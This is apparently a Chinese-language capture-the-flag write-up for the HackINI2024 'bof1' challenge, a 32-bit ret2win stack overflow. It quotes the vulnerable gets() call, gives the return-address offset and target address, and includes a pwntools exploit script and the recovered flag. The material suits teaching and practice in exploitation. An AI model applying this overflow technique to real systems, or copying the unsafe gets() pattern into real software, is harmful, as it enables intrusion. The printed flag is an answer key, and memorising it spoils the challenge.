# HackINI2024 bof1

## 题目简述

题目是一个 32 位 ret2win。`vuln()` 使用 `gets()` 读入 64 字节缓冲区，程序关闭栈保护且未启用 PIE，同时保留了直接打印 flag 的 `get_flag()` 函数。目标是覆盖保存的返回地址，使 `vuln()` 返回到 `get_flag()`。

## 解题过程

源码中的危险点非常直接：

```c
void vuln() {
    char buf[64];
    gets(buf);
}
```

对附件二进制测得从输入起点到保存返回地址的偏移为 76 字节，`get_flag()` 的固定地址为 `0x08049230`。构造 76 字节填充并追加该地址：

```python
from pwn import *

context.binary = elf = ELF("./chall", checksec=False)
io = process(elf.path)

payload = b"A" * 76 + p32(elf.sym.get_flag)
io.sendlineafter(b"Enter your name: ", payload)
print(io.recvall().decode())
```

等价的固定地址 payload 为：

```python
payload = b"A" * 76 + p32(0x08049230)
```

函数返回后执行 `get_flag()`，得到：

```text
shellmates{B0f_cAN_oVerWriT3_Ret_4dr_th4T$_n0T_4Ll_Th0uGH}
```

## 方法总结

ret2win 的标准流程是确认危险输入点、用循环序列确定返回地址偏移、查找目标函数地址，再按目标架构打包。这里虽然源码缓冲区只有 64 字节，但保存返回地址偏移是 76，不能把源码数组大小直接当作利用偏移。未启用 PIE 使目标函数地址固定，而关闭栈保护让溢出不会被 canary 提前终止。
